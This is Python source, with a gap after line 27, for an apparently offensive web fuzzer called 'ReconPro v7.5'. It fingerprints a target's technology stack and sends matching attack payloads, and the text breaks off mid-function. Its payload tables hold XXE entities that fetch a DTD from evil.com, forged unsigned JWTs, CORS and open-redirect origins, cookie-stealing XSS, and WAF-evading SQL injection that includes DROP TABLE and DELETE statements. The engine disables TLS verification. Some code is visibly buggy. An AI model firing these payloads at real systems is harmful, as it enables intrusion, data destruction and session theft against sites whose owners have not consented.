     1→"""
     2→ReconPro v7.5 — Context-Aware Payload Fuzzing Engine
     3→=====================================================
     4→Selects intelligent payloads based on the target's detected technology stack
     5→instead of blindly testing all payloads against every parameter.
     6→
     7→Zero external dependencies — uses only stdlib (urllib, re, dataclasses, etc.).
     8→"""
     9→
    10→from __future__ import annotations
    11→
    12→import re
    13→import time
    14→import json
    15→import urllib.parse
    16→import urllib.request
    17→import urllib.error
    18→from dataclasses import dataclass, field
    19→from typing import Optional
    20→
    21→
    22→# ──────────────────────────────────────────────────────────────────────────────
    23→# TECH_SIGNATURES — Clues for fingerprinting the target technology stack
    24→# ──────────────────────────────────────────────────────────────────────────────
    25→
    26→TECH_SIGNATURES: dict[str, dict[str, str | list[str]]] = {
    27→    "headers": {
   684→            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar://file:///tmp/evil.jar!/evil.txt">]><foo>&xxe;</foo>',
   685→            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "netdoc://etc/passwd">]><foo>&xxe;</foo>',
   686→            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://evil.com/xxe.dtd">%remote;]><foo>test</foo>',
   687→            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "data://text/plain;base64,SGVsbG8=">]><foo>&xxe;</foo>',
   688→        ],
   689→    },
   690→
   691→    # ── JWT Bypass ─────────────────────────────────────────────────────────
   692→    "jwt_bypass": {
   693→        "generic": [
   694→            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
   695→            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoic3VwZXJhZG1pbiJ9.",
   696→            "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJpc3MiOiJhZG1pbiIsInN1YiI6IjEyMzQ1Njc4OTAifQ.",
   697→            '{"alg":"none","typ":"JWT"}.{"user":"admin"}.',
   698→            '{"alg":"HS256","typ":"JWT"}.{"user":"admin"}.invalid_sig',
   699→            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.",
   700→            "eyJhbGciOiJITUFDU0hBMjU2IiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
   701→            "eyJhbGciOiJBbm9ueW1vdXMiLCJ0eXAiOiJKV1QifQ.eyJ1c2VyIjoiYWRtaW4ifQ.",
   702→            '{"kid":"../../dev/null","alg":"HS256"}.{"user":"admin"}.',
   703→            '{"kid":"key\";\nRS256;//","alg":"HS256","typ":"JWT"}.{"user":"admin"}.',
   704→            '{"alg":"HS256","kid":"1; SELECT 1--","typ":"JWT"}.{"user":"admin"}.',
   705→            '{"alg":"RS256","jwk":{"kty":"oct","k":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"},"typ":"JWT"}.{"user":"admin"}.',
   706→            '{"alg":"PS256","jwk":{"kty":"oct","k":"YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXoxMjM0NTY"},"typ":"JWT"}.eyJ1c2VyIjoiYWRtaW4ifQ.',
   707→            '{"typ":"JWT","alg":"HS256","crit":["exp"],"exp":9223372036854775807}.{"user":"admin"}',
   708→            '{"typ":"JWT","alg":"HS256","x5t":"../../etc/passwd"}.eyJ1c2VyIjoiYWRtaW4ifQ.',
   709→            '{"alg":"none","typ":"JWT"}.eyJhZG1pbiI6dHJ1ZX0.',
   710→            "eyJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0.",
   711→            '{"alg":"HS256","typ":"JWT"}.{"iss":"admin","sub":"1234567890","admin":true}',
   712→            '{"alg":"ES256","kty":"EC","crv":"P-256","x":"admin","y":"admin"}.eyJ1c2VyIjoiYWRtaW4ifQ.',
   713→            '{"alg":"HS256","typ":"JWT"}.eyJpYXQiOjk5OTk5OTk5OTl9.',
   714→            '{"typ":"JWT","alg":"none"}.eyJpZCI6MSwibmFtZSI6ImFkbWluIn0.',
   715→        ],
   716→    },
   717→
   718→    # ── CORS Exploitation ───────────────────────────────────────────────────
   719→    "cors": {
   720→        "generic": [
   721→            "https://evil.com",
   722→            "https://evil.com",
   723→            "null",
   724→            "https://evil.com.localhost",
   725→            "https://evil.com.127.0.0.1",
   726→            "https://evil.com.0.0.0.0",
   727→            "https://localhost.evil.com",
   728→            "https://evil.com:8080",
   729→            "https://127.0.0.1",
   730→            "https://evil.com%.target.com",
   731→            "https://evil.com%00.target.com",
   732→            "https://evil.com@target.com",
   733→            "https://target.com@evil.com",
   734→            "https://evil.com;.target.com",
   735→            "https://target.com.evil.com",
   736→        ],
   737→    },
   738→
   739→    # ── CSRF Token Bypass ───────────────────────────────────────────────────
   740→    "csrf": {
   741→        "generic": [
   742→            "DELETE",
   743→            "remove",
   744→            "",
   745→            "undefined",
   746→            "null",
   747→            "00000000000000000000000000000000",
   748→            "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
   749→            "test-token",
   750→            "1234567890",
   751→            "{\"token\":\"none\"}",
   752→        ],
   753→    },
   754→
   755→    # ── Open Redirect ────────────────────────────────────────────────────────
   756→    "open_redirect": {
   757→        "generic": [
   758→            "https://evil.com",
   759→            "//evil.com",
   760→            "https://evil.com%00.target.com",
   761→            "/\\evil.com",
   762→            "https://evil.com@target.com",
   763→            "https://target.com@evil.com",
   764→            "https://evil.com%2F%2Ftarget.com",
   765→            "https://evil.com%5Ctarget.com",
   766→            "https://evil.com%09target.com",
   767→            "/https:/evil.com",
   768→            "https:///evil.com",
   769→            "https://evil.com%0d%0atarget.com",
   770→            "https://evil.com%5c%5ctarget.com",
   771→            "//evil.com/%2f..",
   772→            "javascript:alert(1)",
   773→        ],
   774→    },
   775→
   776→    # ── WAF Bypass ──────────────────────────────────────────────────────────
   777→    "waf_bypass": {
   778→        "space2comment": [
   779→            "/**/UNION/**/SELECT/**/NULL,NULL,NULL--",
   780→            "UN/**/ION/**/SE/**/LECT/**/NULL,NULL,NULL",
   781→            "/**/OR/**/1=1--",
   782→            "SELECT/**/username/**/FROM/**/users",
   783→            "UNION/**/ALL/**/SELECT",
   784→            "/**/AND/**/1=1--",
   785→            "/**/AND/**/1=2--",
   786→            "SE/**/LECT/**/1,2,3/**/FROM/**/users",
   787→            "/**/ORDER/**/BY/**/1--",
   788→            "/**/GROUP/**/BY/**/1--",
   789→        ],
   790→        "case_alternation": [
   791→            "uNiOn SeLeCt NuLl,NuLl,NuLl--",
   792→            "UnIoN AlL SeLeCt",
   793→            "sElEcT UsErNaMe FrOm UsErS",
   794→            "AnD 1=1--",
   795→            "Or 1=1--",
   796→            "UnIoN sElEcT 1,2,3,4--",
   797→            "SeLeCt * FrOm InFoRmAtIoN_sChEmA.tAbLeS",
   798→            "dRoP TaBlE UsErS--",
   799→            "InSeRt InTo UsErS VaLuEs(1,'admin','pass')--",
   800→            "DeLeTe FrOm UsErS WhErE 1=1--",
   801→        ],
   802→        "unicode_normalization": [
   803→            "u\u0300nion select null,null,null--",
   804→            "\u0075nion \u0073elect null,null,null--",
   805→            "and\u00001=1--",
   806→            "sel\u0065ct * from users",
   807→            "uni\u00f3n s\u00e9lect null,null,null",
   808→            "UN\u00cfON SELE\u00c7T",
   809→            "and%u00201=1--",
   810→            "sel%u0065ct",
   811→            "un%u0069on",
   812→        ],
   813→        "double_encoding": [
   814→            "%2527 OR 1=1--",
   815→            "%2527%2520UNION%2520SELECT%2520NULL,NULL,NULL--",
   816→            "%252f%252f",
   817→            "%252e%252e%252f",
   818→            "%253Cscript%253Ealert(1)%253C/script%253E",
   819→            "%2527%2522%253E%253Csvg%252fonload=alert(1)%253E",
   820→            "%2522%255Ealert(1)%2522",
   821→            "%27%20OR%201%3D1--",
   822→            "%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E",
   823→            "%2522%253E%253Cscript%253Ealert(document.cookie)%253C/script%253E",
   824→        ],
   825→    },
   826→
   827→    # ── Local File Inclusion (LFI) ──────────────────────────────────────────
   828→    "lfi": {
   829→        "generic": _LFI_PAYLOADS,
   830→    },
   831→
   832→    # ── Remote File Inclusion (RFI) ─────────────────────────────────────────
   833→    "rfi": {
   834→        "generic": _RFI_PAYLOADS,
   835→    },
   836→}
   837→
   838→
   839→# ──────────────────────────────────────────────────────────────────────────────
   840→# TECH_PROFILE — Data container for fingerprinting results
   841→# ──────────────────────────────────────────────────────────────────────────────
   842→
   843→@dataclass
   844→class TechProfile:
   845→    """Result of technology detection against a target."""
   846→    frameworks: list[str] = field(default_factory=list)
   847→    language: Optional[str] = None
   848→    server: Optional[str] = None
   849→    waf: Optional[str] = None
   850→    cms: Optional[str] = None
   851→    has_graphql: bool = False
   852→    has_rest_api: bool = False
   853→    confidence: float = 0.0
   854→
   855→    def to_dict(self) -> dict:
   856→        return {
   857→            "frameworks": self.frameworks,
   858→            "language": self.language,
   859→            "server": self.server,
   860→            "waf": self.waf,
   861→            "cms": self.cms,
   862→            "has_graphql": self.has_graphql,
   863→            "has_rest_api": self.has_rest_api,
   864→            "confidence": self.confidence,
   865→        }
   866→
   867→    def __repr__(self) -> str:
   868→        parts = []
   869→        if self.cms:
   870→            parts.append(f"cms={self.cms}")
   871→        if self.language:
   872→            parts.append(f"lang={self.language}")
   873→        if self.frameworks:
   874→            parts.append(f"fw={','.join(self.frameworks)}")
   875→        if self.server:
   876→            parts.append(f"srv={self.server}")
   877→        if self.waf:
   878→            parts.append(f"waf={self.waf}")
   879→        return f"TechProfile({', '.join(parts)}, confidence={self.confidence:.0%})"
   880→
   881→
   882→# ──────────────────────────────────────────────────────────────────────────────
   883→# TECH_DETECTOR — Fingerprinting engine
   884→# ──────────────────────────────────────────────────────────────────────────────
   885→
   886→class TechDetector:
   887→    """Analyzes HTTP responses, headers, HTML, and URLs to identify
   888→    the technology stack of a target application."""
   889→
   890→    def __init__(self) -> None:
   891→        self._reset()
   892→
   893→    def _reset(self) -> None:
   894→        self._frameworks: set[str] = set()
   895→        self._language: Optional[str] = None
   896→        self._server: Optional[str] = None
   897→        self._waf: Optional[str] = None
   898→        self._cms: Optional[str] = None
   899→        self._has_graphql: bool = False
   900→        self._has_rest_api: bool = False
   901→        self._confidence: float = 0.0
   902→        self._hits: int = 0
   903→
   904→    def analyze(
   905→        self,
   906→        target: str,
   907→        response_headers: dict[str, str],
   908→        html_body: str = "",
   909→        js_files: Optional[list[str]] = None,
   910→    ) -> TechProfile:
   911→        """Run full analysis and return a TechProfile."""
   912→        self._reset()
   913→        if js_files is None:
   914→            js_files = []
   915→
   916→        self._analyze_headers(response_headers)
   917→        self._analyze_html(html_body)
   918→        self._analyze_cookies(response_headers)
   919→        self._analyze_url(target)
   920→        self._analyze_js_files(js_files)
   921→        self._analyze_url_paths(target)
   922→
   923→        if self._hits > 0:
   924→            self._confidence = min(self._hits * 0.12, 1.0)
   925→
   926→        return TechProfile(
   927→            frameworks=list(self._frameworks),
   928→            language=self._language,
   929→            server=self._server,
   930→            waf=self._waf,
   931→            cms=self._cms,
   932→            has_graphql=self._has_graphql,
   933→            has_rest_api=self._has_rest_api,
   934→            confidence=self._confidence,
   935→        )
   936→
   937→    def _analyze_headers(self, headers: dict[str, str]) -> None:
   938→        header_signatures = TECH_SIGNATURES["headers"]
   939→        header_map = TECH_SIGNATURES["waf_signatures"]
   940→
   941→        for header_key, mapping in header_signatures.items():
   942→            header_val = headers.get(header_key, "")
   943→            if not isinstance(mapping, dict):
   944→                continue
   945→            for pattern, tech in mapping.items():
   946→                if isinstance(tech, str) and tech and pattern:
   947→                    if pattern.lower() in header_val.lower():
   948→                        if tech == "Drupal" or tech == "WordPress" or tech == "Joomla":
   949→                            self._cms = tech
   950→                            self._hits += 2
   951→                        elif tech in ("nginx", "Apache", "IIS", "Caddy", "LiteSpeed", "OpenResty"):
   952→                            self._server = tech
   953→                            self._hits += 1
   954→                        elif tech == "PHP":
   955→                            self._language = "PHP"
   956→                            self._hits += 1
   957→                        elif tech == "Python":
   958→                            self._language = "Python"
   959→                            self._hits += 1
   960→                        elif tech == "Java":
   961→                            self._language = "Java"
   962→                            self._hits += 1
   963→                        elif tech == "Ruby":
   964→                            self._language = "Ruby"
   965→                            self._hits += 1
   966→                        elif tech == "ASP.NET" or tech == "ASP.NET MVC" or tech == "ASP.NET Core":
   967→                            self._language = "ASP.NET"
   968→                            self._frameworks.add("ASP.NET")
   969→                            self._hits += 1
   970→                        elif tech in ("Express", "Django", "Flask", "Tornado", "Next.js", "React", "Vue", "Nuxt"):
   971→                            self._frameworks.add(tech)
   972→                            self._hits += 1
   973→                        elif tech == "Cloudflare":
   974→                            self._waf = "Cloudflare WAF"
   975→                            self._hits += 1
   976→                        else:
   977→                            self._frameworks.add(tech)
   978→                            self._hits += 1
   979→
   980→                if pattern == "" and mapping.get(header_key, "") == "" and header_val:
   981→                    tech_name = list(mapping.values())[0] if mapping else ""
   982→                    if tech_name and tech_name == "":
   983→                        tech_name = header_key.split("-")[-1].strip()
   984→                        self._hits += 1
   985→
   986→        for sig_header, waf_name in header_map.items():
   987→            if sig_header in headers:
   988→                self._waf = waf_name
   989→                self._hits += 1
   990→                break
   991→
   992→    def _analyze_html(self, html: str) -> None:
   993→        if not html:
   994→            return
   995→        html_lower = html.lower()
   996→
   997→        meta_signatures = TECH_SIGNATURES["html_meta"]
   998→        for meta_type, mapping in meta_signatures.items():
   999→            if meta_type == "generator":
  1000→                match = re.search(
  1001→                    r'<meta\s+[^>]*?name=["\']generator["\'][^>]*?content=["\']([^"\']+)["\']',
  1002→                    html_lower,
  1003→                    re.IGNORECASE,
  1004→                )
  1005→                if match:
  1006→                    gen_value = match.group(1).strip().lower()
  1007→                    for pattern, tech in mapping.items():
  1008→                        if pattern.lower() in gen_value:
  1009→                            if tech in ("WordPress", "Joomla", "Drupal", "Ghost", "vBulletin", "phpBB", "MediaWiki"):
  1010→                                self._cms = tech
  1011→                            else:
  1012→                                self._frameworks.add(tech)
  1013→                            self._hits += 2
  1014→                            break
  1015→
  1016→            if meta_type == "viewport":
  1017→                if 'name="viewport"' in html_lower or 'content="width=device-width' in html_lower:
  1018→                    self._hits += 0.5
  1019→
  1020→        ext_signatures = TECH_SIGNATURES["file_extensions"]
  1021→        for ext, lang in ext_signatures.items():
  1022→            safe_ext = re.escape(ext)
  1023→            pattern = rf'(?:src|href)=["\'][^"\']*{safe_ext}(?:\?[^"\']*)?["\']'
  1024→            if re.search(pattern, html_lower):
  1025→                if self._language is None:
  1026→                    self._language = lang
  1027→                self._hits += 1
  1028→
  1029→    def _analyze_cookies(self, headers: dict[str, str]) -> None:
  1030→        cookie_header = headers.get("Set-Cookie", "") or headers.get("Cookie", "")
  1031→        cookie_signatures = TECH_SIGNATURES["cookies"]
  1032→
  1033→        for cookie_name, lang in cookie_signatures.items():
  1034→            if cookie_name.lower() in cookie_header.lower():
  1035→                if lang == "PHP" and self._language is None:
  1036→                    self._language = "PHP"
  1037→                elif lang == "Java" and self._language is None:
  1038→                    self._language = "Java"
  1039→                elif lang == "ASP.NET" and self._language is None:
  1040→                    self._language = "ASP.NET"
  1041→                elif lang == "Rails" and self._language is None:
  1042→                    self._language = "Ruby"
  1043→                    self._frameworks.add("Rails")
  1044→                elif lang == "Laravel":
  1045→                    self._frameworks.add("Laravel")
  1046→                elif lang == "CodeIgniter":
  1047→                    self._frameworks.add("CodeIgniter")
  1048→                elif lang == "Express":
  1049→                    self._frameworks.add("Express")
  1050→                elif lang == "Django":
  1051→                    self._frameworks.add("Django")
  1052→                elif lang == "Angular":
  1053→                    self._frameworks.add("Angular")
  1054→                elif lang == "Next.js":
  1055→                    self._frameworks.add("Next.js")
  1056→                self._hits += 1
  1057→
  1058→    def _analyze_url(self, target: str) -> None:
  1059→        url_patterns = TECH_SIGNATURES["url_patterns"]
  1060→        target_lower = target.lower()
  1061→
  1062→        for pattern, tech in url_patterns.items():
  1063→            if pattern.lower() in target_lower:
  1064→                if tech == "GraphQL":
  1065→                    self._has_graphql = True
  1066→                    self._frameworks.add("GraphQL")
  1067→                elif tech == "REST API":
  1068→                    self._has_rest_api = True
  1069→                elif tech in ("WordPress", "Joomla", "Drupal"):
  1070→                    self._cms = tech
  1071→                elif tech == "Swagger/OpenAPI":
  1072→                    self._has_rest_api = True
  1073→                    self._frameworks.add("Swagger")
  1074→                elif tech == "Spring Boot":
  1075→                    self._frameworks.add("Spring Boot")
  1076→                    self._language = "Java"
  1077→                elif tech == "Django":
  1078→                    self._frameworks.add("Django")
  1079→                    self._language = "Python"
  1080→                elif tech == "Flask":
  1081→                    self._frameworks.add("Flask")
  1082→                    self._language = "Python"
  1083→                elif tech == "Dotenv":
  1084→                    self._hits += 1
  1085→                else:
  1086→                    self._frameworks.add(tech)
  1087→                self._hits += 1
  1088→
  1089→    def _analyze_js_files(self, js_files: list[str]) -> None:
  1090→        js_signatures = TECH_SIGNATURES["js_libraries"]
  1091→
  1092→        for js_path in js_files:
  1093→            js_lower = js_path.lower()
  1094→            for pattern, tech in js_signatures.items():
  1095→                if pattern.lower() in js_lower:
  1096→                    self._frameworks.add(tech)
  1097→                    self._hits += 1
  1098→                    break
  1099→
  1100→    def _analyze_url_paths(self, target: str) -> None:
  1101→        ext_signatures = TECH_SIGNATURES["file_extensions"]
  1102→        parsed = urllib.parse.urlparse(target)
  1103→        path = parsed.path.lower()
  1104→
  1105→        for ext, lang in ext_signatures.items():
  1106→            if path.endswith(ext):
  1107→                if self._language is None:
  1108→                    self._language = lang
  1109→                self._hits += 1
  1110→
  1111→
  1112→# ──────────────────────────────────────────────────────────────────────────────
  1113→# FUZZ_RESULT — Result of a single fuzz test
  1114→# ──────────────────────────────────────────────────────────────────────────────
  1115→
  1116→@dataclass
  1117→class FuzzResult:
  1118→    """Result of testing a single payload against a target parameter."""
  1119→    payload: str = ""
  1120→    category: str = ""
  1121→    classification: str = "none"
  1122→    matched_pattern: str = ""
  1123→    status_code: int = 0
  1124→    response_time: float = 0.0
  1125→    is_vulnerable: bool = False
  1126→    url: str = ""
  1127→    param: str = ""
  1128→
  1129→    def to_dict(self) -> dict:
  1130→        return {
  1131→            "payload": self.payload,
  1132→            "category": self.category,
  1133→            "classification": self.classification,
  1134→            "matched_pattern": self.matched_pattern,
  1135→            "status_code": self.status_code,
  1136→            "response_time": self.response_time,
  1137→            "is_vulnerable": self.is_vulnerable,
  1138→            "url": self.url,
  1139→            "param": self.param,
  1140→        }
  1141→
  1142→    def __repr__(self) -> str:
  1143→        status = "VULN" if self.is_vulnerable else "SAFE"
  1144→        return (
  1145→            f"FuzzResult({status} | {self.category} | {self.classification} | "
  1146→            f"status={self.status_code} | time={self.response_time:.3f}s | "
  1147→            f"payload={self.payload[:50]})"
  1148→        )
  1149→
  1150→
  1151→# ──────────────────────────────────────────────────────────────────────────────
  1152→# RESPONSE PATTERN DATABASE — Patterns used for response analysis
  1153→# ──────────────────────────────────────────────────────────────────────────────
  1154→
  1155→_SQL_ERROR_PATTERNS: list[re.Pattern] = [
  1156→    re.compile(r"you have an error in your sql syntax", re.IGNORECASE),
  1157→    re.compile(r"warning.*mysql", re.IGNORECASE),
  1158→    re.compile(r"unclosed quotation mark after the character string", re.IGNORECASE),
  1159→    re.compile(r"quoted string not properly terminated", re.IGNORECASE),
  1160→    re.compile(r"sql syntax.*mysql", re.IGNORECASE),
  1161→    re.compile(r"postgresql.*error", re.IGNORECASE),
  1162→    re.compile(r"psql.*error", re.IGNORECASE),
  1163→    re.compile(r"pg_query\(\)", re.IGNORECASE),
  1164→    re.compile(r"unterminated quoted string", re.IGNORECASE),
  1165→    re.compile(r"microsoft.*odbc.*sql server", re.IGNORECASE),
  1166→    re.compile(r"oledb.*sql server", re.IGNORECASE),
  1167→    re.compile(r"microsoft sql native client", re.IGNORECASE),
  1168→    re.compile(r"syntax error.*sqlite", re.IGNORECASE),
  1169→    re.compile(r"sqlite_busy", re.IGNORECASE),
  1170→    re.compile(r"ora-\d{5}", re.IGNORECASE),
  1171→    re.compile(r"oracle.*driver", re.IGNORECASE),
  1172→    re.compile(r"java\.sql\.sqlexception", re.IGNORECASE),
  1173→    re.compile(r"com\.mysql\.jdbc", re.IGNORECASE),
  1174→    re.compile(r"system\.data\.sqlclient", re.IGNORECASE),
  1175→    re.compile(r"sqlstate\[", re.IGNORECASE),
  1176→    re.compile(r"unclosed parenthesis", re.IGNORECASE),
  1177→    re.compile(r"syntax error near", re.IGNORECASE),
  1178→    re.compile(r"query failed", re.IGNORECASE),
  1179→    re.compile(r"sql query failed", re.IGNORECASE),
  1180→]
  1181→
  1182→_STACK_TRACE_PATTERNS: list[re.Pattern] = [
  1183→    re.compile(r"traceback \(most recent call last\)", re.IGNORECASE),
  1184→    re.compile(r"at \w+\.\w+\(.*\)", re.IGNORECASE),
  1185→    re.compile(r"exception in thread", re.IGNORECASE),
  1186→    re.compile(r"java\.lang\.\w+exception", re.IGNORECASE),
  1187→    re.compile(r"system\.nullreferenceexception", re.IGNORECASE),
  1188→    re.compile(r"fatal error", re.IGNORECASE),
  1189→    re.compile(r"unhandled exception", re.IGNORECASE),
  1190→    re.compile(r"NameError", re.IGNORECASE),
  1191→    re.compile(r"TypeError", re.IGNORECASE),
  1192→    re.compile(r"ValueError", re.IGNORECASE),
  1193→]
  1194→
  1195→_XSS_PATTERN: re.Pattern = re.compile(r"<script|onerror|onload|javascript:|alert\(|prompt\(|document\.cookie", re.IGNORECASE)
  1196→
  1197→_SSTI_PATTERN: re.Pattern = re.compile(r"(?:\{\{.*\}\}|\$\{.*\}|<%.*%>|%.*%)", re.IGNORECASE)
  1198→
  1199→_PATH_TRAVERSAL_PATTERN: re.Pattern = re.compile(r"root:.*:0:0:|daemon:|nobody:|www-data:|\\[Dd]rivers\\|\\[Ww]indows\\|boot\.ini", re.IGNORECASE)
  1200→
  1201→_CMD_INJECTION_PATTERN: re.Pattern = re.compile(r"uid=\d+.*gid=\d+|groups=\d+|drwx|total \d+|for 16-bit|OS Name:", re.IGNORECASE)
  1202→
  1203→_LFI_PATTERN: re.Pattern = re.compile(r"root:x:0:0:|bin/bash|\[boot loader\]|\[extensions\]|root:.*:0:|daemon:|nobody:", re.IGNORECASE)
  1204→
  1205→_RFI_PATTERN: re.Pattern = re.compile(r"system\s*\(|eval\s*\(|base64_decode|<\?php", re.IGNORECASE)
  1206→
  1207→
  1208→# ──────────────────────────────────────────────────────────────────────────────
  1209→# FUZZ_SESSION — Main fuzzing engine
  1210→# ──────────────────────────────────────────────────────────────────────────────
  1211→
  1212→class FuzzSession:
  1213→    """Context-aware fuzzing session that selects payloads based on the
  1214→    target's detected technology stack."""
  1215→
  1216→    def __init__(
  1217→        self,
  1218→        target: str,
  1219→        tech_profile: Optional[TechProfile] = None,
  1220→        timeout: float = 10.0,
  1221→        user_agent: str = "ReconPro/7.5 (Security Scanner)",
  1222→        verify_ssl: bool = False,
  1223→    ) -> None:
  1224→        self.target = target.rstrip("/")
  1225→        self.tech_profile = tech_profile
  1226→        self.timeout = timeout
  1227→        self.user_agent = user_agent
  1228→        self.verify_ssl = verify_ssl
  1229→        self.results: list[FuzzResult] = []
  1230→        self._base_time: float = 0.0
  1231→        self._baseline_status: int = 0
  1232→        self._opener = self._build_opener()
  1233→
  1234→    def _build_opener(self) -> urllib.request.OpenerDirector:
  1235→        """Build a URL opener with optional SSL bypass."""
  1236→        if not self.verify_ssl:
  1237→            import ssl
  1238→            ctx = ssl._create_unverified_context()
  1239→            https_handler = urllib.request.HTTPSHandler(context=ctx)
  1240→            return urllib.request.build_opener(https_handler)
  1241→        return urllib.request.build_opener()
  1242→
  1243→    def _make_request(
  1244→        self,
  1245→        url: str,
  1246→        params: Optional[dict[str, str]] = None,
  1247→        headers: Optional[dict[str, str]] = None,
  1248→        method: str = "GET",
  1249→    ) -> tuple[int, str, float, dict[str, str]]:
  1250→        """Make an HTTP request and return (status_code, body, time, headers)."""
  1251→        if params and method == "GET":
  1252→            query = urllib.parse.urlencode(params)
  1253→            url = f"{url}?{query}"
  1254→
  1255→        req_headers = {
  1256→            "User-Agent": self.user_agent,
  1257→            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  1258→            "Accept-Language": "en-US,en;q=0.5",
  1259→        }
  1260→        if headers:
  1261→            req_headers.update(headers)
  1262→
  1263→        body_data: Optional[bytes] = None
  1264→        if params and method == "POST":
  1265→            body_data = urllib.parse.urlencode(params).encode("utf-8")
  1266→            req_headers["Content-Type"] = "application/x-www-form-urlencoded"
  1267→
  1268→        req = urllib.request.Request(url, data=body_data, headers=req_headers, method=method)
  1269→
  1270→        try:
  1271→            start = time.monotonic()
  1272→            resp = self._opener.open(req, timeout=self.timeout)
  1273→            elapsed = time.monotonic() - start
  1274→            resp_body = resp.read().decode("utf-8", errors="replace")
  1275→            resp_headers = dict(resp.headers)
  1276→            return resp.status, resp_body, elapsed, resp_headers
  1277→        except urllib.error.HTTPError as e:
  1278→            elapsed = time.monotonic() - time.monotonic() + 0.001
  1279→            try:
  1280→                resp_body = e.read().decode("utf-8", errors="replace")
  1281→            except Exception:
  1282→                resp_body = ""
  1283→            resp_headers = dict(e.headers) if hasattr(e, "headers") else {}
  1284→            return e.code, resp_body, elapsed, resp_headers
  1285→        except urllib.error.URLError:
  1286→            elapsed = 0.0
  1287→            return 0, "", elapsed, {}
  1288→        except Exception:
  1289→            elapsed = 0.0
  1290→            return 0, "", elapsed, {}
  1291→
  1292→    def calibrate(self) -> None:
  1293→        """Send a baseline request to establish normal response time and status."""
  1294→        status, _, elapsed, _ = self._make_request(self.target)
  1295→        self._baseline_status = status
  1296→        self._base_time = elapsed
  1297→
  1298→    def get_all_categories(self) -> list[str]:
  1299→        """Return a list of all available payload categories."""
  1300→        return list(PAYLOAD_DATABASE.keys())
  1301→
  1302→    def select_payloads(self, category: str) -> list[str]:
  1303→        """Select the most relevant payloads for the detected tech stack.
  1304→
  1305→        Priority logic:
  1306→          1. If tech_profile is available, prefer framework-specific payloads.
  1307→          2. Language-specific SQL payloads (e.g., Django -> postgres, WordPress -> mysql).
  1308→          3. Framework-specific template payloads (e.g., Django -> jinja2/django SSTI).
  1309→          4. CMS-specific extras for WordPress/Drupal/Joomla.
  1310→          5. Generic payloads always included as fallback.
  1311→        """
  1312→        if category not in PAYLOAD_DATABASE:
  1313→            return []
  1314→
  1315→        cat_payloads = PAYLOAD_DATABASE[category]
  1316→        selected: list[str] = []
  1317→        seen: set[str] = set()
  1318→
  1319→        def _add(payloads: list[str]) -> None:
  1320→            for p in payloads:
  1321→                if p not in seen:
  1322→                    selected.append(p)
  1323→                    seen.add(p)
  1324→
  1325→        # -- If we have a tech profile, prioritize matching payloads --------
  1326→        if self.tech_profile:
  1327→            tp = self.tech_profile
  1328→            fw_set = set(tp.frameworks)
  1329→            lang = tp.language
  1330→
  1331→            # --- SQL injection: route by detected language/backend ----------
  1332→            if category == "sqli":
  1333→                if any(fw in fw_set for fw in ("Django", "Flask", "Python", "FastAPI")):
  1334→                    if "postgres" in cat_payloads:
  1335→                        _add(cat_payloads["postgres"])
  1336→                if lang == "PHP" or tp.cms in ("WordPress", "Drupal", "Joomla"):
  1337→                    if "mysql" in cat_payloads:
  1338→                        _add(cat_payloads["mysql"])
  1339→                if lang == "Java" or any(fw in fw_set for fw in ("Spring Boot", "Tomcat", "Jetty")):
  1340→                    if "oracle" in cat_payloads:
  1341→                        _add(cat_payloads["oracle"])
  1342→                    if "mssql" in cat_payloads:
  1343→                        _add(cat_payloads["mssql"])
  1344→                if lang == "ASP.NET" or "ASP.NET" in fw_set:
